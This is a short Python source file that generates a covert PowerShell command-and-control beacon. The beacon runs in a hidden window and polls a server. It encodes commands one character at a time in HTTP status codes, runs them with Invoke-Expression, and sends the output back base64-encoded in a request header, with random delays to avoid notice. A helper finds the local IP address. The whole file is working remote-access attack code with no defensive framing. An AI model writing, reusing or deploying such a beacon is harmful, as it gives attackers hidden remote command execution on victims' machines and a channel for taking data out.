import socket

def generate_beacon(server_url="http://127.0.0.1:8000"):
	windows_beacon = '''
	powershell -w hidden -Command "$S=\\"SERVER_URL\\";$B=\\"\\";$G=[guid]::NewGuid().ToString();while($true){try{$C=[int](Invoke-WebRequest \\"$S/poll\\" -UseBasicParsing -Headers @{\\"X-Client\\"=$G} -ErrorAction Stop).StatusCode}catch{try{$C=$_.Exception.Response.StatusCode.Value__}catch{$C=0}};if($C-ge 200 -and $C-le 326){$x=$C-200;if($x-eq 10){try{$R=Invoke-Expression $B|Out-String}catch{$R=$_|Out-String};$E=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($R.Trim()));$r=[System.Net.WebRequest]::Create(\\"$S/poll\\");$r.Method=\\"GET\\";$r.Headers.Add(\\"X-Output\\",$E);$r.Headers.Add(\\"X-Client\\",$G);try{$r.GetResponse().Close()}catch{};$B=\\"\\"}elseif($x-ge 32 -and $x-le 126){$B+=[char]$x}};Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 3500)}"
	'''.replace("SERVER_URL", server_url)
	return windows_beacon

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"
